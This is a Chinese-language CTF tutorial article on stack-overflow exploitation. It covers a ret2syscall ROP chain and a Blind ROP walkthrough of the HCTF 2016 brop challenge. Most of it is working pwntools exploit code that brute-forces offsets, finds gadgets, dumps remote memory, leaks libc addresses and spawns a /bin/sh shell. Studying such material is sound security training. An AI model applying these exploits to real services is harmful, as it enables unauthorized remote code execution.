> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9K1SdkJ6U2wDg9vNS8B-Og)

![](https://mmbiz.qpic.cn/mmbiz_jpg/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnOUGzQLuzP37icFJaVvBWBTu4JgiceNbTshL9gias9aCqkW9voORu4bTug/640?wx_fmt=jpeg)

**pwn - 栈溢出 2**

**ROP**
=======

**返回导向编程**（英语：Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允许攻击者在程序启用了安全保护技术（如堆栈不可执行）的情况下控制程序执行流，执行恶意代码 [1]。其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为 **Gadgets**）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

### **栈帧变化**

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dA6YRAxQRpORbQLOSafIbWGggCdqgmSkSOPq38RUXq4JjWOmYiandaf3Q/640?wx_fmt=png)

**普通 ROP:**
===========

### **方法 1：**

*   F5 反汇编
    

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dABc34v4rqoxVwq269K7njdLQ2o8yFOIocib5zbhNxBsb4iaHtsP4icxFaQ/640?wx_fmt=png)

*   checksec 查看信息
    

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAiaibMIch6kZEnbcDUWYp1Y5LgTdBP4p48IMMTHhSAEwGbr2or4vnwR9A/640?wx_fmt=png)

*   计算 padding
    

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dACE2lTkicK6Mza7kvIqEeCAxLuY5YGbdQ3nxfoDBiaaWVu39y8POlNo7w/640?wx_fmt=png)

*   查找 gadgets
    

```
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'
ROPgadget --binary ret2syscall --only 'int'
ROPgadget --binary ret2syscall --string '/bin/sh'
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dANI522f3jrLq3ohDPjUP1NsNzy61ARZCicbt1RHUVCHfQbO8iccKBGvlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dA3qKgHXy4WwT2eSs67zw0e4sNiaicQFHQNOKCqEc1p9dboNnZ0vDGbZAw/640?wx_fmt=png)

```
ROPgadget --binary ret2syscall --ropchain
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dA0oYUpwbZBsgicklOC8WSXbFWAwcWiag3paWNh8Um7eL1l5omUfTNicibyg/640?wx_fmt=png)

### **方法 2：**

```
ROPgadget --binary ret2syscall --ropchain
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAwrO55Uej5Wm8IbpbuRPteTEgnbibsFgsY2nntWKOxRGfYc8rNeicVy5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dADc5TNtWhh6EuBktGSzWSibc6ww8JnIxupicWM6fK3sCgOmSqm8Byws6w/640?wx_fmt=png)

```
from struct import pack
# Padding goes here
p = b''

p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
p += pack(b'<I', 0x080ea060) # @ .data
p += pack(b'<I', 0x080bb196) # pop eax ; ret
p += b'/bin'
p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
p += pack(b'<I', 0x080ea064) # @ .data + 4
p += pack(b'<I', 0x080bb196) # pop eax ; ret
p += b'//sh'
p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
p += pack(b'<I', 0x080ea068) # @ .data + 8
p += pack(b'<I', 0x08054590) # xor eax, eax ; ret
p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack(b'<I', 0x080481c9) # pop ebx ; ret
p += pack(b'<I', 0x080ea060) # @ .data
p += pack(b'<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
p += pack(b'<I', 0x080ea068) # @ .data + 8
p += pack(b'<I', 0x080ea060) # padding without overwrite ebx
p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
p += pack(b'<I', 0x080ea068) # @ .data + 8
p += pack(b'<I', 0x08054590) # xor eax, eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
p += pack(b'<I', 0x08049421) # int 0x80

from pwn import *
# context.log_level="debug"
sh = process('./ret2syscall')

# print(p)
sh.sendline(b'A'*112 + p)
sh.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAQjfCezfOJqMAOrzW2eBSqUjkWohtFgTpbotoG5Baq5HKnH0yibu90mA/640?wx_fmt=png)

**BROP:**
=========

### **利用条件**  

1.  存在稳定触发的栈溢出漏洞。
    
2.  进程崩溃后，会立即重启，且重启后的内存不会重新随机化。这样及时开启了 ASLR 也可以利用  
    
3.  如果开启了 PIE，则服务器必须是 fork 服务器，且不能使用 execve。
    

### **利用阶段**

1.  Stack Reading : 泄露返回地址和 canaries。根据返回地址确定加载地址。一个字节一个字节爆破 8 字节 canaries，每个字节有 256 中可能性。
    
2.  BROP：远程搜索 gadgets，目标是将目标程序从内存写到 socket，传回攻击者本地。
    

1.  通过 syscall、call 调用类似 write、put 等函数。
    

4.  Build EXP: 利用 gadgets 构造的 ROP，从内存中拿出来。就可以进行普通 ROP 攻击了。
    

### **例二：HCTF 2016 brop**

```
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int i;
int check();

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("WelCome my friend,Do you know password?");
        if(!check()) {
            puts("Do not dump my memory");
        } else {
            puts("No password, no game");
        }
}

int check() {
    char buf[50];
    read(STDIN_FILENO, buf, 1024);
    return strcmp(buf, "aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```

出题人 GitHub 连接 https://github.com/zh-explorer/hctf2016-brop

1. 爆破溢出长度。每次增加一个字符，如果正常返回说明没有溢出。如果刚好错误，说明已经溢出了。返回溢出值 - 1

```
def get_buffer_size():
    for i in range(100):
        payload = "A"
        payload += "A" * i
        buf_size = len(payload) - 1
        try:
            p = remote('192.168.190.129', 10001)
            p.recvuntil("password?\n")
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size
```

2. 找到一个 stop_gadget。这个目的是找到一个类似 sleep 的函数，程序执行到此会挂在这里。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dABgLtBZgicPE0m19y1MnzPN9oxEnJne8Qffe8jicoSUbw7z9xcVm3r6ng/640?wx_fmt=png)

```
def get_stop_addr(buf_size):
    addr = 0x400000
    while 1:
        addr += 1
        payload = b'a' * buf_size
        payload += p64(addr)

        try:
            p = get_io()
            p.sendline(payload)
            p.recv(timeout=1)
            p.close()
            log.info("stop addr:0x%x" % addr)
            return addr
        except EOFError as e:
            # p.close()
            log.info("stop bad 0x%x" % addr)
        except:
            p.close()
            addr -= 1
```

3. 找到一个通用的 gadget。目的是操作 rdi，通过寄存器 rdi 进行传值。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAy9Agpnh7N4kTz6uDJv8cv4NHoHogDWBqiauDk42XLCuyiaobD9YFrnZQ/640?wx_fmt=png)

而 5f c3 就是 pop rdi;ret，所以 pop_rdi = gadget_addr + 9

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dA3ImR2tkg0u2HkYvM1HhPibnMKwTZ2tYIsBdShOQm2ibbEnib9m8Vo4DkA/640?wx_fmt=png)

```
def get_gadgets_addr(buf_size, stop_addr):
    addr = stop_addr
    while 1:
        # sleep(0.1)
        addr += 1
        payload = b'a' * buf_size
        payload += p64(addr)
        payload += p64(1)
        payload += p64(2)
        payload += p64(3)
        payload += p64(4)
        payload += p64(5)
        payload += p64(6)
        try:
            io = get_io()
            io.sendline(payload + p64(stop_addr))
            io.recv(timeout=1)
            io.close()
            log.info("find address: 0x%x" % addr)
            try:
                io = get_io()
                io.sendline(payload)
                io.recv(timeout=1)
                io.close()
                log.info("bad address 0x%x" % addr)
            except:
                io.close()
                log.info("gadget address:0x%x" % addr)
                return addr
        except EOFError as e:
            io.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("can't connect")
            addr -= 1
```

此时堆栈情况

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAiaMby4Ybcz8fEjxFF1gqagOJlooGxy8ddZBJFwtQJZiaLLIictgMaSsTg/640?wx_fmt=png)

4. 找到程序中的 puts、write 函数。目的是通过这个函数打印程序内存数据、函数地址等。

利用 Windows 可执行文件 45 5a linux \7fELF 方式进行判断是否是真正的 put 地址。

```
def get_puts_call_addr(buf_size, stop_addr, gadget_addr):
    addr = stop_addr
    pop_rdi = gadget_addr + 9
    # addr = 0x401190
    while 1:
        sleep(0.1)
        addr += 1
        payload = b'a' * buf_size
        payload += p64(pop_rdi)
        payload += p64(0x400000)
        payload += p64(addr)
        payload += p64(stop_addr)

        try:
            io = get_io()
            io.sendline(payload)
            # print(str(io.recv()))
            elf = io.recv()
            if elf.startswith(b"\x7fELF"):
                print(elf)
                log.info("puts call address: 0x%x" % addr)
                io.close()
                return addr
            log.info("puts bad 0x%x" % addr)
            io.close()
        except EOFError as e:
            io.close()
            log.info("puts bad 0x%x" % addr)
        except:
            log.info("can't connect")
            addr -= 1
```

此时堆栈分析

pdi = 0x400000  ==  puts(0x400000)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dALdxAF8q8ysiclibjvj2IeBqmV3eic6AURknxFHTroO9iaQxRGibgLPVzhEQ/640?wx_fmt=png)

5.dump 程序内存，和第四步一样，只是这里确定了函数地址，变化参数值而已。目的是打印函数内存，找到 put_got 的值

```
def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):
    pop_rdi = gadgets_addr + 9  # pop rdi; ret

    result = b""
    while start_addr < end_addr:
        # print result.encode('hex')
        # sleep(0.1)
        payload = b"A" * buf_size
        payload += p64(pop_rdi)
        payload += p64(start_addr)
        payload += p64(puts_plt)
        payload += p64(stop_addr)
        try:
            p = get_io()
            p.sendline(payload)
            data = p.recv(timeout=0.1)  # timeout makes sure to recive all bytes
            if data == "\n":
                data = "\x00"
            elif data[-1] == "\n":
                data = data[:-1]
            # log.info("leaking: 0x%x --> %s" % (start_addr, (data or '').encode('hex')))
            result += data
            start_addr += len(data)
            p.close()
            print("%d" % (end_addr - start_addr))
        except:
            # pass
            log.info("Can't connect")
    return result
```

6. 分析 dump 的内存

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAKC60E0y7oAU29MoKWEhVoia4MJYKsibftqGxbnv5ly43segXzCMPK7Ow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAAO1foSpBsG8RB4VWUFtrD9Z0YH3CnGxRlCG5unUKqlydJpdcBHb5uA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAiaWBpCucLPkmKn7RSPNgZ2qQAFlese1a9EIBlSwRXFibZAY17HXnUuGg/640?wx_fmt=png)

7. 根据 got 地址找到函数地址

```
def get_puts_addr(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
    payload = b"A" * buf_size
    payload += p64(gadget_addr + 9)
    payload += p64(puts_got)
    payload += p64(puts_call_addr)
    payload += p64(stop_addr)

    data = b''

    p = get_io()
    p.sendline(payload)
    data = p.recvline()
    data = u64(data[:-1] + b'\x00\x00')
    log.info("puts address: 0x%x" % data)
    p.close()
    return data
```

puts(puts_got)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAXsic3ico2UcxBu2Rqz2sdC3qLib9QPwlYDibDm3KkBib7VGaqKcxYdCT8uQ/640?wx_fmt=png)

8. 利用 ret2libc 中学习的基地址绑定关系，得到 system 和 / bin/sh 地址

```
def leak(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
    global system_addr, binsh_addr

    puts_addr = get_puts_addr(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)

    # 利用libcsearch
    # libcSearch = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libcSearch.dump('puts')
    #
    # system_addr = libc_base + libcSearch.dump('system')
    # binsh_addr = libc_base + libcSearch.dump('str_bin_sh')
    #
    # log.info("system 0x%x" % system_addr)
    # log.info("system 0x%x" % binsh_addr)
    #
    
    # 利用libc.so
    libc = ELF('./ubuntu_libc.so.6')
    libc_base = puts_addr - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    # binsh_addr = puts_addr - libc.sym['puts'] + 0x186C6C
    print(hex(libc.sym['system']))
    binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
    log.info("system 0x%x" % system_addr)
    log.info("binsh 0x%x" % binsh_addr)
```

9. 执行 system

```
def pwn(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
    payload = b'a' * buf_size
    payload += p64(gadget_addr + 9)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    io = get_io()
    io.sendline(payload)
    io.interactive()
```

rdi = /bin/sh

system("/bin/sh")

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09KgjFmyJx0huoq212ge9dAP0Brp3lXgNDibGJy4ZwKadjEscBsEwhj5dRmOqwVfPicD6VAUGsZ2uXA/640?wx_fmt=png)

10. 执行

```
if __name__ == "__main__":
    # buf_size = get_buffer_size()
    buf_size = 
    # stop_addr = get_stop_addr(buf_size)
    stop_addr = 
    # gadget_addr = get_gadgets_addr(buf_size, stop_addr)
    gadget_addr = 
    # puts_call_addr = get_puts_call_addr(buf_size, stop_addr, gadget_addr)
    # puts_call_addr = 
    puts_call_addr = 

    
    #
    # data_bin = dump_memory(72,stop_addr,gadget_addr,puts_call_addr,0x400000,0x402000)
    # with open('data.bin','wb') as f:
    #     f.write(data_bin)
    #     f.close()
    
    # puts_got = 
    puts_got = 
    leak(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)
    pwn(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)
```

**=END=**